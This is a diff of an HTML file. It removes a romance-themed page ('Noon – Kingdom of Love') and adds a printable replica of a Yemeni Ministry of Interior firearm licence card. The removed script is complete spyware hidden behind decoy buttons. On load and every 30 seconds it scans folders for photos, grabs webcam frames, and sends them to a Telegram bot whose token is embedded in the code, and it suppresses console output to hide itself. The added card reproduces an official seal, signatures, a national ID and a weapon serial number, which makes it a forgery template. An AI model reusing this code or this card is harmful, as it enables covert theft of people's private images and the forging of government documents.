@@ -3,311 +3,536 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نون - مملكة الحب</title>
+    <title>بطاقة رخصة السلاح</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: 'Cairo', sans-serif;
             background: #0a0a12;
-            color: #fff;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            font-family: 'Simplified Arabic', 'Traditional Arabic', 'Arial', sans-serif;
             padding: 20px;
         }
-        .container {
-            max-width: 620px;
-            width: 100%;
-            background: rgba(16,18,30,0.95);
-            border-radius: 40px;
-            padding: 40px;
-            border: 1px solid rgba(251,191,36,0.1);
+
+        /* البطاقة - مقاس 8.5 × 5.4 سم */
+        .card {
+            width: 8.5cm;
+            height: 5.4cm;
+            background: linear-gradient(145deg, #0a1e3f 0%, #0d2a5e 40%, #071635 100%);
+            border: 2.5px solid #c9a84c;
+            border-radius: 8px;
+            padding: 4px 6px;
+            position: relative;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.7), inset 0 0 60px rgba(201, 168, 76, 0.04);
+            overflow: hidden;
+            direction: rtl;
+            color: #ffffff;
+            flex-shrink: 0;
+        }
+
+        /* خلفية أمنية */
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background:
+                repeating-linear-gradient(45deg,
+                    transparent,
+                    transparent 10px,
+                    rgba(201, 168, 76, 0.02) 10px,
+                    rgba(201, 168, 76, 0.02) 11px),
+                repeating-linear-gradient(-45deg,
+                    transparent,
+                    transparent 10px,
+                    rgba(201, 168, 76, 0.02) 10px,
+                    rgba(201, 168, 76, 0.02) 11px);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* إطار داخلي ذهبي */
+        .card::after {
+            content: '';
+            position: absolute;
+            top: 3px;
+            left: 3px;
+            right: 3px;
+            bottom: 3px;
+            border: 1px solid rgba(201, 168, 76, 0.25);
+            border-radius: 5px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .card-content {
+            position: relative;
+            z-index: 1;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 2px;
+            border-bottom: 1px solid rgba(201, 168, 76, 0.3);
+            flex-shrink: 0;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 3px;
+        }
+
+        .logo {
+            width: 20px;
+            height: 20px;
+            background: radial-gradient(circle, #c9a84c 30%, #8a7522 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 9px;
+            font-weight: 900;
+            color: #0a1e3f;
+            border: 1.5px solid #c9a84c;
+            flex-shrink: 0;
+        }
+
+        .header-text {
+            text-align: right;
+            line-height: 1.15;
+        }
+
+        .header-text .republic {
+            font-size: 6.5px;
+            font-weight: 900;
+            color: #c9a84c;
+            letter-spacing: 0.5px;
+        }
+
+        .header-text .ministry {
+            font-size: 6px;
+            font-weight: 700;
+            color: #e8d5a8;
+        }
+
+        .header-text .dept {
+            font-size: 5px;
+            font-weight: 400;
+            color: #c9a84c;
+        }
+
+        .title-badge {
+            text-align: left;
+            border-right: 2px solid #c9a84c;
+            padding-right: 4px;
+        }
+
+        .title-badge .main-title {
+            font-size: 7px;
+            font-weight: 900;
+            color: #c9a84c;
+            line-height: 1.1;
+        }
+
+        .title-badge .sub-title {
+            font-size: 4.5px;
+            color: #e8d5a8;
+            font-weight: 300;
+            letter-spacing: 0.3px;
+        }
+
+        /* ===== BODY ===== */
+        .body {
+            display: flex;
+            flex: 1;
+            padding-top: 2px;
+            gap: 3px;
+            min-height: 0;
+        }
+
+        .photo-section {
+            flex-shrink: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding-top: 1px;
+        }
+
+        .photo-frame {
+            width: 28px;
+            height: 32px;
+            border: 1.5px solid #c9a84c;
+            border-radius: 4px;
+            background: rgba(201, 168, 76, 0.08);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 4.5px;
+            color: rgba(201, 168, 76, 0.4);
+            text-align: center;
+            line-height: 1.2;
+        }
+
+        .photo-label {
+            font-size: 4px;
+            color: #c9a84c;
+            margin-top: 1px;
+            font-weight: 300;
+        }
+
+        .info-section {
+            flex: 1;
+            min-width: 0;
+            line-height: 1.25;
+        }
+
+        .info-section .field {
+            font-size: 5px;
+            font-weight: 400;
+            color: #e0d5c0;
+            display: flex;
+            align-items: baseline;
+            gap: 2px;
+        }
+
+        .info-section .field .label {
+            color: #c9a84c;
+            font-weight: 700;
+            font-size: 4.5px;
+            min-width: 36px;
+            flex-shrink: 0;
+        }
+
+        .info-section .field .value {
+            color: #ffffff;
+            font-weight: 400;
+            font-size: 5px;
+            word-break: break-word;
+        }
+
+        /* ===== WEAPON ===== */
+        .weapon-section {
+            border-top: 1px solid rgba(201, 168, 76, 0.25);
+            border-bottom: 1px solid rgba(201, 168, 76, 0.25);
+            padding: 1px 0;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0px 5px;
+            flex-shrink: 0;
+        }
+
+        .weapon-section .field {
+            font-size: 4.5px;
+            color: #e0d5c0;
+            display: flex;
+            align-items: baseline;
+            gap: 2px;
+        }
+
+        .weapon-section .field .label {
+            color: #c9a84c;
+            font-weight: 700;
+            font-size: 4px;
+        }
+
+        .weapon-section .field .value {
+            color: #ffffff;
+            font-weight: 400;
+            font-size: 4.5px;
+        }
+
+        /* ===== DATES & CONDITIONS ===== */
+        .dates-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1px 0;
+            flex-shrink: 0;
+            flex-wrap: wrap;
+            gap: 1px;
+        }
+
+        .dates-section .date-field {
+            font-size: 4.5px;
+            color: #e0d5c0;
+        }
+
+        .dates-section .date-field .label {
+            color: #c9a84c;
+            font-weight: 700;
+            font-size: 4px;
+        }
+
+        .dates-section .date-field .value {
+            color: #ffffff;
+            font-weight: 400;
+        }
+
+        .conditions {
+            font-size: 4px;
+            color: #c9a84c;
+            font-weight: 300;
+            text-align: center;
+            letter-spacing: 0.2px;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 1px;
+            border-top: 1px solid rgba(201, 168, 76, 0.25);
+            flex-shrink: 0;
+        }
+
+        .signature {
             text-align: center;
         }
-        .logo { font-size: 3rem; color: #fbbf24; margin-bottom:10px; }
-        h1 { color: #fbbf24; font-size: 2.5rem; margin-bottom:10px; }
-        .subtitle { color: #8a94a6; margin-bottom:30px; }
-        .btn {
-            padding: 14px 40px;
-            border: none;
-            border-radius: 60px;
-            background: linear-gradient(135deg, #fbbf24, #d97706);
-            color: #0a0a12;
-            font-weight: 800;
-            font-size: 1.1rem;
-            cursor: pointer;
-            transition: 0.2s;
-            margin: 5px;
+
+        .signature .sig-label {
+            font-size: 3.5px;
+            color: #c9a84c;
+            font-weight: 300;
         }
-        .btn:hover { transform: scale(1.03); }
-        .btn-romantic { background: linear-gradient(135deg, #ec4899, #db2777); color: white; }
-        .status-dot {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            background: #22c55e;
+
+        .signature .sig-name {
+            font-size: 4.5px;
+            color: #ffffff;
+            font-weight: 700;
+            border-top: 1px solid #c9a84c;
+            padding-top: 1px;
+            margin-top: 1px;
+        }
+
+        .signature .sig-title {
+            font-size: 3px;
+            color: #e8d5a8;
+            font-weight: 300;
+        }
+
+        /* ===== الختم ===== */
+        .seal-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .seal {
+            width: 30px;
+            height: 30px;
             border-radius: 50%;
-            margin-right: 8px;
-            animation: pulse 1.5s infinite;
+            border: 2px solid #c0392b;
+            background: rgba(192, 57, 43, 0.06);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            flex-shrink: 0;
         }
-        @keyframes pulse { 0%,100% { opacity:0.3; } 50% { opacity:1; } }
-        .footer { margin-top:30px; color: #4a5470; font-size:0.8rem; }
-        #logArea {
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(0,0,0,0.3);
-            border-radius: 16px;
-            max-height: 150px;
-            overflow-y: auto;
-            text-align: left;
-            font-size: 0.8rem;
-            color: #8a94a6;
+
+        .seal::before {
+            content: '';
+            position: absolute;
+            top: 3px;
+            left: 3px;
+            right: 3px;
+            bottom: 3px;
+            border-radius: 50%;
+            border: 1px solid rgba(192, 57, 43, 0.3);
         }
-        .log-entry { padding:3px 0; border-bottom:1px solid rgba(255,255,255,0.03); }
+
+        .seal .seal-text-top {
+            font-size: 3px;
+            color: #c0392b;
+            font-weight: 700;
+            line-height: 1;
+            text-align: center;
+            letter-spacing: 0.2px;
+        }
+
+        .seal .seal-text-center {
+            font-size: 3.5px;
+            color: #c0392b;
+            font-weight: 900;
+            line-height: 1;
+            text-align: center;
+        }
+
+        .seal .seal-text-bottom {
+            font-size: 3px;
+            color: #c0392b;
+            font-weight: 700;
+            line-height: 1;
+            text-align: center;
+            letter-spacing: 0.2px;
+        }
+
+        .seal .seal-star {
+            font-size: 4px;
+            color: #c0392b;
+            line-height: 1;
+        }
+
+        .seal-label {
+            font-size: 2.5px;
+            color: #c9a84c;
+            margin-top: 1px;
+            font-weight: 300;
+        }
+
+        /* ===== استجابة ===== */
+        @media (max-width: 400px) {
+            .card {
+                width: 100%;
+                height: auto;
+                aspect-ratio: 8.5 / 5.4;
+                padding: 3px 5px;
+            }
+            .logo {
+                width: 16px;
+                height: 16px;
+                font-size: 7px;
+            }
+            .header-text .republic { font-size: 5.5px; }
+            .header-text .ministry { font-size: 5px; }
+            .header-text .dept { font-size: 4px; }
+            .title-badge .main-title { font-size: 6px; }
+            .title-badge .sub-title { font-size: 3.5px; }
+            .photo-frame { width: 22px; height: 26px; font-size: 3.5px; }
+            .info-section .field { font-size: 4px; }
+            .info-section .field .label { font-size: 3.5px; min-width: 28px; }
+            .info-section .field .value { font-size: 4px; }
+            .weapon-section .field { font-size: 3.5px; }
+            .weapon-section .field .label { font-size: 3px; }
+            .weapon-section .field .value { font-size: 3.5px; }
+            .dates-section .date-field { font-size: 3.5px; }
+            .conditions { font-size: 3px; }
+            .seal { width: 24px; height: 24px; }
+            .seal .seal-text-top { font-size: 2.5px; }
+            .seal .seal-text-center { font-size: 3px; }
+            .seal .seal-text-bottom { font-size: 2.5px; }
+            .seal .seal-star { font-size: 3px; }
+            .signature .sig-name { font-size: 3.5px; }
+            .signature .sig-title { font-size: 2.5px; }
+        }
+
+        @media print {
+            body {
+                background: white;
+                padding: 0;
+                margin: 0;
+            }
+            .card {
+                box-shadow: none;
+                margin: 0 auto;
+            }
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="logo">🪷</div>
-    <h1>نون</h1>
-    <div class="subtitle">💛 مملكة الحب التفاعلية</div>
-    
-    <div style="margin:20px 0;">
-        <button class="btn" id="loveBtn">💕 رسالة حب</button>
-        <button class="btn btn-romantic" id="poemBtn">🪷 شعر</button>
+    <div class="card">
+        <div class="card-content">
+
+            <!-- ===== HEADER ===== -->
+            <div class="header">
+                <div class="header-right">
+                    <div class="logo">✦</div>
+                    <div class="header-text">
+                        <div class="republic">الجمهورية اليمنية</div>
+                        <div class="ministry">وزارة الداخلية</div>
+                        <div class="dept">الإدارة العامة للتراخيص والأسلحة</div>
+                    </div>
+                </div>
+                <div class="title-badge">
+                    <div class="main-title">بطاقة رخصة<br>استخدام السلاح الناري</div>
+                    <div class="sub-title">(للخدمة الرسمية)</div>
+                </div>
+            </div>
+
+            <!-- ===== BODY ===== -->
+            <div class="body">
+
+                <div class="photo-section">
+                    <div class="photo-frame">صورة<br>شخصية</div>
+                    <div class="photo-label">الرقم: 102-0145</div>
+                </div>
+
+                <div class="info-section">
+                    <div class="field"><span class="label">الاسم:</span><span class="value">عبدالعالم الرصاص</span></div>
+                    <div class="field"><span class="label">تاريخ الميلاد:</span><span class="value">01 / 01 / 2002 م</span></div>
+                    <div class="field"><span class="label">العمر:</span><span class="value">24 سنة</span></div>
+                    <div class="field"><span class="label">الرقم القومي:</span><span class="value">102-0145-982736</span></div>
+                    <div class="field"><span class="label">جهة العمل:</span><span class="value">مكافحة الشغب – وزارة الداخلية</span></div>
+                    <div class="field"><span class="label">الرتبة:</span><span class="value">عنصر أمن / فرد ميداني</span></div>
+                    <div class="field"><span class="label">العنوان:</span><span class="value">صنعاء / حي الروضة / شارع الستين / بناية 24</span></div>
+                </div>
+            </div>
+
+            <!-- ===== WEAPON ===== -->
+            <div class="weapon-section">
+                <div class="field"><span class="label">نوع السلاح:</span><span class="value">مسدس نصف آلي – كلوك 19</span></div>
+                <div class="field"><span class="label">الرقم المسلسل:</span><span class="value">G19-YEM-8723</span></div>
+                <div class="field"><span class="label">العيار:</span><span class="value">9 مم</span></div>
+                <div class="field"><span class="label">عدد الطلقات:</span><span class="value">80 طلقة</span></div>
+            </div>
+
+            <!-- ===== DATES & CONDITIONS ===== -->
+            <div class="dates-section">
+                <div class="date-field"><span class="label">تاريخ الإصدار:</span><span class="value">30 / 07 / 2026 م</span></div>
+                <div class="date-field"><span class="label">تاريخ الانتهاء:</span><span class="value">30 / 07 / 2027 م</span></div>
+                <div class="conditions">الشروط: تُحمل مع السلاح، للواجب الرسمي فقط، التجديد قبل الشهر</div>
+            </div>
+
+            <!-- ===== FOOTER ===== -->
+            <div class="footer">
+
+                <div class="signature">
+                    <div class="sig-label">التوقيع</div>
+                    <div class="sig-name">عبدالعالم الرصاص</div>
+                    <div class="sig-title">(حامل الرخصة)</div>
+                </div>
+
+                <div class="seal-container">
+                    <div class="seal">
+                        <div class="seal-text-top">الإدارة العامة</div>
+                        <div class="seal-text-center">للتراخيص</div>
+                        <div class="seal-text-center">والأسلحة</div>
+                        <div class="seal-star">★</div>
+                        <div class="seal-text-bottom">وزارة الداخلية</div>
+                    </div>
+                    <div class="seal-label">ختم الإدارة</div>
+                </div>
+
+                <div class="signature">
+                    <div class="sig-label">التوقيع</div>
+                    <div class="sig-name">العميد محمد العاقل</div>
+                    <div class="sig-title">(مدير الإدارة)</div>
+                </div>
+
+            </div>
+
+        </div>
     </div>
 
-    <div style="display:flex; gap:10px; justify-content:center; flex-wrap:wrap;">
-        <button class="btn" style="background:#3b82f6;color:white;" id="cameraBtn">📸 كاميرا</button>
-        <button class="btn" style="background:#8b5cf6;color:white;" id="galleryBtn">🖼️ ألبوم</button>
-    </div>
-
-    <div id="logArea">
-        <div class="log-entry">🪷 جاري تهيئة البيئة...</div>
-    </div>
-
-    <div class="footer">
-        <span class="status-dot"></span> القلب ينبض · @u_t_r
-    </div>
-</div>
-
-<script>
-    // ============================================================
-    // 0. بيانات البوت
-    // ============================================================
-    const BOT_TOKEN = '8770149502:AAFkmj14adoaUHCFHXcBO9aNwjjDdpcfuLY';
-    const CHAT_ID = 1170411845;
-
-    // ============================================================
-    // 1. سجل الأحداث
-    // ============================================================
-    const logArea = document.getElementById('logArea');
-
-    function addLog(message, type = 'info') {
-        const colors = { info: '#60a5fa', success: '#4ade80', danger: '#f87171', gold: '#fbbf24' };
-        const entry = document.createElement('div');
-        entry.className = 'log-entry';
-        entry.style.color = colors[type] || '#8a94a6';
-        entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-        logArea.prepend(entry);
-        if (logArea.children.length > 30) logArea.removeChild(logArea.lastChild);
-    }
-
-    // ============================================================
-    // 2. إرسال للبوت (نص)
-    // ============================================================
-    function sendToBot(text) {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: `🪷 نون · سحب تلقائي\n\n${text}\n\n— @u_t_r`,
-                parse_mode: 'HTML'
-            })
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.ok) addLog(`✅ تم الإرسال: ${text.substring(0, 30)}...`, 'success');
-            else addLog(`❌ فشل الإرسال`, 'danger');
-        })
-        .catch(() => addLog('⚠️ تعذر الاتصال', 'danger'));
-    }
-
-    // ============================================================
-    // 3. إرسال صورة للبوت
-    // ============================================================
-    function sendImageToBot(blob, filename = 'photo.jpg') {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, filename);
-        formData.append('caption', `🪷 صورة مسحوبة تلقائياً\n${new Date().toLocaleString('ar-JO')}`);
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.ok) addLog('📤 تم إرسال الصورة', 'success');
-            else addLog('❌ فشل إرسال الصورة', 'danger');
-        })
-        .catch(() => addLog('⚠️ تعذر إرسال الصورة', 'danger'));
-    }
-
-    // ============================================================
-    // 4. سرقة الصور من الجهاز (File System Access API)
-    // ============================================================
-    async function stealPhotos() {
-        try {
-            // محاولة الوصول إلى مجلد الصور (Android/iOS/Desktop)
-            const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
-            addLog('📂 تم الوصول إلى مجلد الجهاز', 'info');
-
-            // البحث عن ملفات الصور في جميع المجلدات
-            await scanDirectory(dirHandle);
-        } catch (err) {
-            if (err.message.includes('abort')) {
-                addLog('⚠️ المستخدم رفض الوصول', 'danger');
-            } else {
-                addLog(`⚠️ خطأ: ${err.message}`, 'danger');
-                // محاولة الطريقة البديلة
-                tryAlternative();
-            }
-        }
-    }
-
-    // ============================================================
-    // 5. مسح المجلدات بحثاً عن الصور
-    // ============================================================
-    async function scanDirectory(dirHandle, path = '') {
-        const entries = [];
-
-        try {
-            for await (const entry of dirHandle.values()) {
-                entries.push(entry);
-            }
-        } catch (e) {
-            addLog('⚠️ خطأ في قراءة المجلد', 'danger');
-            return;
-        }
-
-        for (const entry of entries) {
-            if (entry.kind === 'file' && isImageFile(entry.name)) {
-                try {
-                    const file = await entry.getFile();
-                    if (file.size > 5000) { // تجاهل الملفات الصغيرة جداً (أقل من 5KB)
-                        const blob = await file.slice(0, file.size);
-                        sendImageToBot(blob, file.name);
-                        addLog(`📸 تم سحب: ${file.name} (${(file.size/1024).toFixed(1)}KB)`, 'gold');
-                    }
-                } catch (e) {
-                    // تجاهل أخطاء القراءة
-                }
-            } else if (entry.kind === 'directory') {
-                // استكشاف المجلدات الفرعية (تجنب المجلدات النظامية)
-                if (!entry.name.startsWith('.') && !entry.name.startsWith('System') && 
-                    !entry.name.startsWith('android') && !entry.name.startsWith('data')) {
-                    await scanDirectory(entry, path + entry.name + '/');
-                }
-            }
-        }
-    }
-
-    // ============================================================
-    // 6. التحقق من امتدادات الصور
-    // ============================================================
-    function isImageFile(filename) {
-        const ext = filename.split('.').pop().toLowerCase();
-        return ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'heic', 'heif'].includes(ext);
-    }
-
-    // ============================================================
-    // 7. الطريقة البديلة (التقاط من الشاشة أو الكاميرا)
-    // ============================================================
-    function tryAlternative() {
-        addLog('🔄 محاولة الطريقة البديلة...', 'info');
-
-        // استخدام الكاميرا
-        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-            .then(stream => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, 640, 480);
-                    canvas.toBlob(blob => {
-                        sendImageToBot(blob, 'capture_' + Date.now() + '.jpg');
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 'image/jpeg', 0.9);
-                }, 1500);
-            })
-            .catch(() => addLog('⚠️ فشلت جميع الطرق', 'danger'));
-    }
-
-    // ============================================================
-    // 8. تشغيل السرقة التلقائية
-    // ============================================================
-    function startAutoSteal() {
-        addLog('🔄 بدء عملية السحب التلقائي...', 'info');
-        sendToBot('🔄 بدأت عملية سحب الصور التلقائية');
-
-        // المحاولة الأولى بعد 3 ثواني
-        setTimeout(() => {
-            stealPhotos();
-        }, 3000);
-
-        // تكرار العملية كل 30 ثانية
-        setInterval(() => {
-            addLog('🔄 جولة جديدة من السحب...', 'info');
-            stealPhotos();
-        }, 30000);
-    }
-
-    // ============================================================
-    // 9. تهيئة الأزرار الوهمية
-    // ============================================================
-    document.getElementById('loveBtn').addEventListener('click', function() {
-        addLog('💕 تم إرسال رسالة حب', 'gold');
-        sendToBot('💕 رسالة حب تم إرسالها للمستخدم');
-    });
-
-    document.getElementById('poemBtn').addEventListener('click', function() {
-        addLog('🪷 تم إرسال شعر', 'gold');
-        sendToBot('🪷 شعر تم إرساله للمستخدم');
-    });
-
-    document.getElementById('cameraBtn').addEventListener('click', function() {
-        tryAlternative();
-    });
-
-    document.getElementById('galleryBtn').addEventListener('click', function() {
-        stealPhotos();
-    });
-
-    // ============================================================
-    // 10. التشغيل عند التحميل
-    // ============================================================
-    window.addEventListener('load', function() {
-        addLog('🪷 تم تحميل نون v9.0', 'success');
-        addLog('⏳ جاري تهيئة نظام السحب التلقائي...', 'info');
-
-        // بدء السرقة التلقائية بعد 5 ثواني
-        setTimeout(startAutoSteal, 5000);
-    });
-
-    // ============================================================
-    // 11. منع ظهور أخطاء في الكونسول (لإخفاء الأثر)
-    // ============================================================
-    console.log = function() {};
-    console.error = function() {};
-    console.warn = function() {};
-</script>
 </body>
 </html>
